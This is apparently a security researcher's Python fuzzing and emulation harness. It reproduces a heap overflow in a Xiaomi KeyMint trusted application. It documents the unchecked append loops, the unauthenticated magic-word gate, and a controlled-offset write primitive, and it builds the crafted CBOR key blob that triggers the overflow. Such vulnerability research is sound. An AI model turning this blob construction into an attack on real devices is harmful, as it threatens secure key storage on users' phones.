from .params import *
from . import asan
from qiling import Qiling
import struct, os

# === KeyMint deserializeCharacteristics heap-overflow harness (XIAOMI houji) ==
# Target: Xiaomi houji KeyMint QTEE TA, keymint_houji.ta
#         (keymint.mbn sha d57819…, 429024 B; Qualcomm reference image).
#
# This is the cross-device build-presence proof for S22-1: the SAME bug confirmed
# + dynamically reproduced on Samsung S928B, now reproduced on the Xiaomi houji
# build to show it is NOT Samsung-specific (multi-vendor HIGH). The houji offsets
# DIFFER from S928B (different compiled image) but the bug is structurally
# byte-for-byte identical. Static proof: RE/triage/keymint_xdevice.md (§houji),
# verify-checks km_houji_* (BINS keymint_qsee_houji).
#
# BUG (confirmed in the houji binary): deserializeCharacteristics@0x308a0 parses a
# CBOR "characteristics" map out of a key blob and APPENDS each element's value
# into fixed-size in-struct arrays using an index field, with NO capacity check on
# 5 of its 6 append loops (the 6th, @0x30c8c, DOES have `ldr x8,[x19,#0x120];
# cmp x8,#4; b.hi` -- the 5 vulnerable ones omit exactly that). E.g. the PURPOSE
# loop #1 @0x30b04: count = ldrh w28,[sp,#0x10] (CBOR array len, capped 0xffff),
# array base = struct+0x18, index = [struct+0x30]; store @0x30b38
# `str w9,[x8,#0x18]` where x8 = struct + index*4. Capacity is 6 u32s, so
# index >= ~374 reaches past the 0x5f0-byte object.
#
# The object is `qsee_malloc(0x5f0)` (GET_KEY_CHARACTERISTICS-equiv handler @0x6650
# `mov w0,#0x5f0; bl 0x19050`->qsee_malloc(PLT 0x2c0)+memset). The deserializer is
# reached via decodeKeyBlob@0x3115c whose ONLY precondition is the *plaintext*
# magic gate @0x3121c: `ldr x4,[out_struct]@0x31210; cmp x4, 0x4b4d4b44 ("DKMK")
# (mov w8,#0x4b44; movk w8,#0x4b4d,lsl#16 @0x31214/0x31218); b.ne decrypt_path
# (0x3126c)` -- i.e. NO AES-GCM decrypt / NO MAC verification precedes the
# overflow. decodeKeyBlob is invoked from the keyblob-consuming request handlers
# (GET_KEY_CHARACTERISTICS-equiv @0x6650 -> @0x35410 -> ... -> decodeKeyBlob).
#
# STAGING MODEL (identical to the S928B keymint_dkmk harness): we drive
# decodeKeyBlob@0x3115c DIRECTLY:
#   decodeKeyBlob(x0=blob_ptr, x1=blob_len, x2=out_struct, w3=0)
# - blob_ptr/blob_len -> a guest page holding the crafted CBOR key blob.
# - out_struct -> a REDZONED guest region of exactly 0x5f0 user bytes (mapped via
#   asan.install_param_redzones, the SAME [redzone][0x5f0][redzone] layout +
#   hardware write-hooks that qsee_malloc(0x5f0) installs), so the unbounded
#   native `str` that walks off the end of the 0x5f0 object hits the trailing
#   redzone -> invalid_region_write -> CRASH_PC. This faithfully reproduces the
#   handler's allocation; only the outer request-CBOR envelope (which merely
#   extracts the keyblob bstr and the literal qsee_malloc call) is bypassed --
#   not the bug.
#
# The CBOR key-blob bytes are crafted in code (see _build_blob): a CBOR array
# whose first element is the DKMK magic, then the characteristics field = a CBOR
# map of KeyParameter entries; a repeatable-enum tag entry carries a value array
# whose length AFL/the seed drives -- > capacity overflows the object.

# Benign return target: the lifecycle gadget's `ret` @0x250dc is a json `_end`
# pivot address, so a clean (non-overflowing) decodeKeyBlob return stops the
# emulation cleanly in BOTH replay (pivot hook) and fuzz (pivot2 + exits) modes.
# (The overflow is a heap write caught by the asan redzone write-hook BEFORE
# decodeKeyBlob ever returns, so a real _end is correct.)
RET_GADGET        = 0x250dc       # houji `mov w0,wzr@0x250d8; ret@0x250dc` gadget
DECODE_KEY_BLOB   = 0x3115c       # houji decodeKeyBlob(x0=ptr, x1=len, x2=out, w3=0)
OUT_USER_SIZE     = 0x5f0         # exact qsee_malloc size in the real handler

BLOB_BASE   = 0x51000000
BLOB_SIZE   = 0x40000             # plenty for a huge value-array
# out_struct gets mapped redzoned by install_param_redzones (min addr hint):
OUT_MINADDR = 0x52000000

# How many KeyParameter value-array elements to emit. Default forces the overflow
# (>374 to cross the 0x5f0 object). AFL drives it across a wide range otherwise.
DEFAULT_COUNT = int(os.environ.get("KM_COUNT", str(2000)), 0) & 0xFFFFFFFF

# state filled by init_fuzz
_OUT = {}
_BASE = {}   # _BASE["ret"] = rebased RET_GADGET (base + 0x250dc)


# ---- minimal CBOR encoder --------------------------------------------------
def _cbor_hdr(major, val):
    mt = major << 5
    if val < 24:
        return bytes([mt | val])
    elif val < 0x100:
        return bytes([mt | 24, val])
    elif val < 0x10000:
        return bytes([mt | 25]) + struct.pack(">H", val)
    elif val < 0x100000000:
        return bytes([mt | 26]) + struct.pack(">I", val)
    else:
        return bytes([mt | 27]) + struct.pack(">Q", val)

def cbor_uint(v):   return _cbor_hdr(0, v)
def cbor_nint(v):   return _cbor_hdr(1, -1 - v)
def cbor_bstr(b):   return _cbor_hdr(2, len(b)) + b
def cbor_tstr(s):   return _cbor_hdr(3, len(s.encode())) + s.encode()
def cbor_arr(n):    return _cbor_hdr(4, n)      # array header (n items follow)
def cbor_map(n):    return _cbor_hdr(5, n)      # map header
def cbor_int(v):    return cbor_uint(v) if v >= 0 else cbor_nint(v)

DKMK = 0x4b4d4b44   # "DKMK" little-endian word the gate compares ([out_struct]==this)

# KeyMint tag that routes to UNBOUNDED append loop #1 (array @struct+0x18, cap 6
# u32s, index @struct+0x30, store @0x30b38). The tag classifier @0x30ad4 does
# `x8 = tag - 0x20000001; cmp x8,#5; b.hi skip` then a 6-entry jump table @0x57f80;
# tag 0x20000001 -> loop#1 @0x30b04 (== KeyMint TAG_PURPOSE = ENUM_REP|1).
REP_TAG = int(os.environ.get("KM_TAG", str(0x20000001)), 0)


# The value written for each PURPOSE element. Default 374 = (0x5f0-0x18)/4, the
# exact index at which struct+0x18 + idx*4 reaches the end of the 0x5f0 object.
# loop#1 @0x30b04 stores the element value with `str w9,[x8,#0x18]` where
# x8 = struct + idx*4, and the INDEX COUNTER lives at struct+0x30. The array base
# is struct+0x18, so element index 6 lands EXACTLY on the counter at struct+0x30
# (0x18 + 6*4 = 0x30). The append therefore overwrites its own counter with the
# attacker-supplied element value -> the very next iteration indexes at
# struct+0x18 + value*4. With value >= 374 the next store crosses the 0x5f0
# boundary -> heap OOB write (asan after-redzone hook -> CRASH_PC). value==374
# lands the OOB store at exactly obj+0x5f0; larger values reach further. (Same
# controlled-offset/value primitive as S928B loop @0x300e4.)
ELEM_VALUE = int(os.environ.get("KM_ELEM", "374"), 0) & 0xFFFFFFFF


def _build_charmap(count, elem=None):
    # The "characteristics" inner CBOR -- the nested-CBOR envelope that
    # deserializeCharacteristics@0x308a0 accepts (the houji deserializer mirrors
    # S928B's): OUTER map keyed by an int selector, then for each selector an
    # ENTER: w1=1 -> HW-enforced block, w1=0 -> SW block. Shape:
    #   map{ 1: HW_map{ REP_TAG: array(count)[...] }, 0: SW_map{} }
    # The HW_map's REP_TAG (TAG_PURPOSE 0x20000001) value-array drives the
    # unbounded append loop #1 -> heap OOB.
    if elem is None:
        elem = ELEM_VALUE
    cm = bytearray()
    cm += cbor_map(2)                 # outer map: { 1: HW, 0: SW }
    cm += cbor_uint(1)                # selector 1 -> HW-enforced enter (w1=1)
    cm += cbor_map(1)                 #   HW_map { REP_TAG : array(count) }
    cm += cbor_uint(REP_TAG)
    cm += cbor_arr(count)
    for _ in range(min(count, (BLOB_SIZE - 64) // 5)):
        cm += cbor_uint(elem)
    cm += cbor_uint(0)                # selector 0 -> SW-enforced enter (w1=0)
    cm += cbor_map(0)                 #   SW_map {} (empty)
    return bytes(cm)


def _build_blob(count):
    # The key blob top-level is a CBOR ARRAY (pre-DKMK gate @0x48678:
    # ldrb w8,[item]; cmp #4 -> major type 4 array). decodeKeyBlob reads leading
    # fields, the first of which must decode to the magic word 0x4b4d4b44 ("DKMK")
    # at out_struct[0] (gate @0x3121c), then extracts the characteristics as the
    # next item of expected type 6=bstr (0x48e74 w1=6) and passes its bytes to
    # deserializeCharacteristics.
    charmap = _build_charmap(count)
    blob = bytearray()
    blob += cbor_arr(4)                  # [magic, f1, f2, characteristics_bstr]
    blob += cbor_uint(DKMK)              # field0 -> out_struct[0] == "DKMK"
    blob += cbor_uint(0)                 # field1
    blob += cbor_uint(0)                 # field2
    blob += cbor_bstr(charmap)           # characteristics (type-6 bstr)
    return bytes(blob)


def init_fuzz(emu, sid):
    ql = emu.ql
    try:
        ql.mem.map(BLOB_BASE, BLOB_SIZE, info="[km] blob")
    except Exception as e:
        ql.log.warning(f"[km] map blob: {e}")
    # Map a REDZONED out-struct exactly like qsee_malloc(0x5f0): the helper
    # returns (user_ptr, region_base, real_size) and registers HW write-hooks on
    # the redzones + entries in emu.HEAP['redzones'].
    user, region, real = asan.install_param_redzones(ql, emu, b"\x00" * OUT_USER_SIZE,
                                                      OUT_USER_SIZE, OUT_MINADDR)
    _OUT["user"] = user
    _OUT["region"] = region
    _OUT["real"] = real
    # PIE load base, so the json _end pivot (rebased base+0x250dc) is where a benign
    # decodeKeyBlob return must land for a clean stop.
    try:
        base = ql.mem.get_lib_base("keymint_houji.ta")
    except Exception:
        base = 0x555555554000
    _BASE["ret"] = base + RET_GADGET
    print(f"[km] init: base={hex(base)} ret_gadget@{hex(_BASE['ret'])} "
          f"blob@{hex(BLOB_BASE)} out_struct(user)@{hex(user)} "
          f"size={hex(OUT_USER_SIZE)} redzone_after@{hex(user + OUT_USER_SIZE)}")


def place_input_callback(ql: Qiling, input: bytes, _: int):
    count = DEFAULT_COUNT
    if "KM_COUNT" not in os.environ:
        v = struct.unpack_from("<I", input, 0)[0] if len(input) >= 4 else 0
        # wide range so AFL can cross the ~374 boundary; cap so the blob fits.
        count = v % 8001

    # diagnostic: KM_RAWBLOB=<hex> feeds an exact blob (for CBOR-shape bring-up).
    raw = os.environ.get("KM_RAWBLOB", "")
    if raw:
        blob = bytes.fromhex(raw)
    elif "KM_RAWFUZZ" in os.environ:
        # AFL drives the inner characteristics CBOR directly: the input bytes ARE
        # the characteristics map (so AFL can search the bespoke nested envelope on
        # its own); we wrap them in the mandatory blob frame so the DKMK plaintext
        # gate @0x3121c always passes and decodeKeyBlob hands `input` straight to
        # deserializeCharacteristics@0x308a0. A crash = AFL found the (envelope ->
        # over-long REP array) shape that overflows the qsee_malloc(0x5f0) object.
        chars = input[:BLOB_SIZE - 64]
        blob = (cbor_arr(4) + cbor_uint(DKMK) + cbor_uint(0) + cbor_uint(0)
                + cbor_bstr(chars))
    else:
        blob = _build_blob(count)
    if len(blob) > BLOB_SIZE:
        blob = blob[:BLOB_SIZE]
    ql.mem.write(BLOB_BASE, blob)
    # zero the out-struct user area before each run (the index fields at +0x30 etc.
    # must start at 0).
    ql.mem.write(_OUT["user"], b"\x00" * OUT_USER_SIZE)

    setup_params_fuzz(ql, 0, 0, [NoneParam(), NoneParam(), NoneParam(), NoneParam()])

    # decodeKeyBlob(x0=blob_ptr, x1=blob_len, x2=out_struct, w3=0)
    ql.arch.regs.x0 = BLOB_BASE
    ql.arch.regs.x1 = len(blob)
    ql.arch.regs.x2 = _OUT["user"]
    ql.arch.regs.x3 = 0
    ql.arch.regs.x30 = _BASE["ret"]

    print(f"[km] decodeKeyBlob(blob={len(blob)}B, out={hex(_OUT['user'])}, "
          f"value-array count={count}, elem={ELEM_VALUE}) tag={hex(REP_TAG)}")
    return True
